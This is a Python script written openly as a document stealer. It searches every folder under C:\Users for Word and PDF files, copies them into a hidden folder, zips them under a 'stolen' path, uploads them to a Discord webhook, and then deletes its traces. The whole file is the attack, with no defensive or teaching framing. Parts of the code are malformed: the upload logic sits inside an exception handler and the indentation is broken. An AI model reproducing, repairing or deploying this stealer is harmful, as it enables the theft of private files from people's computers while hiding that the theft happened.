import os
import shutil
import zipfile
import uuid
from pathlib import Path
import requests

# === CONFIGURATION === #
WEBHOOK_URL = "LINK TO YOUR DISCORD WEBHOOK!!"  # 
SCAN_EXTENSIONS = ['.docx', '.pdf']
MAX_ZIP_SIZE_MB = 10  # Keep under webhook limits (Discord: ~8–25MB)
TEMP_DIR = Path(f"C:\\Users\\Public\\{uuid.uuid4()}")  # Hidden working folder ✨

# Create temp directory (invisible to normal eyes 👀)
TEMP_DIR.mkdir(exist_ok=True)

def log(message):
    print(f"[WHISPER] {message}")

# === PHASE 1: Find .docx & .pdf files === #
def find_files():
    matches = []
    log("Scanning system for sensitive files...")
    
    try:
        users_dir = Path("C:\\Users")
        for path in users_dir.rglob("*"):
            if path.suffix.lower() in SCAN_EXTENSIONS and path.is_file():
                if path.stat().st_size > 0:  # Skip empty files 🚫📄  
                    matches.append(path)
                    log(f"Found: {path}")
    except Exception as e:
        log(f"Scan error: {e}")
    
    return matches

# === PHASE 2: Split into <10MB ZIP groups === #
def create_zips(files):
    current_zip, current_size = [], 0
    zips_to_send = []

    for file_path in files:
        file_size_mb = file_path.stat().st_size / (1024 * 1024)        
        if current_size + file_size_mb > MAX_ZIP_SIZE_MB:
            if current_zip:
                zips_to_send.append(current_zip[:])
            current_zip, current_size = [], 0
        
        current_zip.append(file_path)
        current_size += file_size_mb
    
    if current_zip:
        zips_to_send.append(current_zip)

    return zips_to_send

# === PHASE 3: Send each ZIP to Discord via Webhook → Self-Clean After Send 🔥=== #
def send_zips(zipped_groups):
   uploaded=0
   
   for group in zipped_groups :
      zip_name= TEMP_DIR / f"payload_{uuid.uuid4().hex[:6]}.zip"
      
      try :
         with zipfile.ZipFile(zip_name,'w',zipfile.ZIP_DEFLATED) as zf :
            for fp in group : 
               try :
                    arcname=f"stolen/{fp.parent.name}/{fp.name}"
                    temp_copy=TEMP_DIR/fp.name 
                    shutil.copy2(fp,temp_copy)  
                    zf.write(temp_copy ,arcname )  
               except Exception as e:
                    log(f"Failed to add {fp}: {e}")
      except Exception as e : 
         log(f"Failed to add {fp}: {e}") 

         # Check size before sending ⚠️  
         zip_mb=os.path.getsize(zip_name)/(1024*1024)
         if zip_mb > MAX_ZIP_SIZE_MB * 1.5:
             log("ZIP too large! Skipping...")
             continue 
         try:
          with open(zip_name,'rb')as f :  
              res=requests.post(
                 WEBHOOK_URL,
                 files={'file':(f"{zip_name.name}.zip",f,"application/zip")}
              )
              
          if res.status_code == 200 or res.status_code == 204:  # (ASCII nums)
             uploaded += 1
             log("[+] Sent " + str(uploaded))
          else:
             log("Fail: " + str(res.status_code))

         finally:
          os.remove(zip_name)

   return uploaded 


## ==PHASE４：ERASING EVERY TRACE🔥==
def cleanup():
    try:
        shutil.rmtree(TEMP_DIR)
    except:
        pass


if __name__ == "__main__":
    found = find_files()
if not found :cleanup();exit()
groups=create_zips(found)
sent=send_zips(groups);log("Sent:"+str(sent)+"zips")
cleanup ()
print ("Boom Disappear")
    